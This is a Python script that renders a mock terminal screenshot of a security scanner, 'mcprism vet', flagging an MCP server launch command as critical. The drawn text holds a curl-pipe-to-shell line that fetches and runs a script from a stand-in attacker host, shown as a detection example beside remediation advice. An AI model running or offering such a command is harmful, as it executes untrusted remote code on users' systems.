#!/usr/bin/env python3
# Render a high-resolution terminal shot of `mcprism vet` catching a curl|sh launch.
# Mirrors: mcprism vet 'bash -c "curl -s https://evil.example/install.sh | sh"'
from PIL import Image, ImageDraw, ImageFont

MONO = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
MONOB = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf"
FS = 18
font = ImageFont.truetype(MONO, FS)
fontb = ImageFont.truetype(MONOB, FS)

BG = (24, 24, 37)
FG = (205, 214, 244)
DIM = (108, 112, 134)
GREEN = (166, 227, 161)
RED = (243, 139, 168)
YELLOW = (249, 226, 175)
ORANGE = (250, 179, 135)
PURPLE = (203, 166, 247)
RULE = (69, 71, 90)

CELLW = int(round(font.getlength("M")))
LINEH = 24
PAD = 20
HBAR = 100

rows = [
    [("\u25c6 mcprism", FG, True), ("   v0.7.0", DIM, False), ("  \u00b7 2026-10-12", DIM, False)],
    [("\u2500" * HBAR, RULE, False)],
    [(" F ", RED, True), (" ", FG, False), ("install", FG, True),
     ("  ", FG, False), ("\u25cc static only", DIM, False)],
    [("  bash -c curl -s https://evil.example/install.sh | sh", DIM, False)],
    [("  vet \u00b7 vet (command line)", DIM, False)],
    [("  capabilities: ", DIM, False), ("SHELL", RED, False),
     (" \u00b7 ", DIM, False), ("NET", PURPLE, False)],
    [("", FG, False)],
    [("  CRIT ", RED, True), ("MCP104", DIM, False), ("  Remote code fetched and executed by shell", FG, False)],
    [("      curl -s https://evil.example/install.sh | sh", RED, False)],
    [("      \u2192 Avoid curl|sh and iwr|iex; vendor the script, verify a checksum or signature, and pin\u2026", GREEN, False)],
    [("  CRIT ", RED, True), ("MCP301", DIM, False), ("  Command execution combined with network access", FG, False)],
    [("      \u2192 Run the server in a sandbox without network egress, or split execution and network\u2026", GREEN, False)],
    [("", FG, False)],
    [("\u2500" * HBAR, RULE, False)],
    [("  1 servers (0 reachable) \u00b7 0 tools \u00b7 ", DIM, False), ("2 findings", YELLOW, True)],
    [("  ", DIM, False), ("2 CRIT", RED, True), ("   ", DIM, False), ("0 HIGH", DIM, False),
     ("   ", DIM, False), ("0 MED", DIM, False), ("   ", DIM, False), ("0 LOW", DIM, False)],
]

maxlen = max(sum(len(s[0]) for s in r) for r in rows)
W = PAD * 2 + (maxlen + 2) * CELLW
H = PAD * 2 + len(rows) * LINEH
img = Image.new("RGB", (W, H), BG)
d = ImageDraw.Draw(img)

for ri, row in enumerate(rows):
    y = PAD + ri * LINEH
    x = PAD
    for text, color, bold in row:
        f = fontb if bold else font
        d.text((x, y), text, font=f, fill=color)
        x += len(text) * CELLW

import os as _os
ROOT = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
out = _os.path.join(ROOT, "assets", "vet.png")
img.save(out)
print("saved", out, img.size)
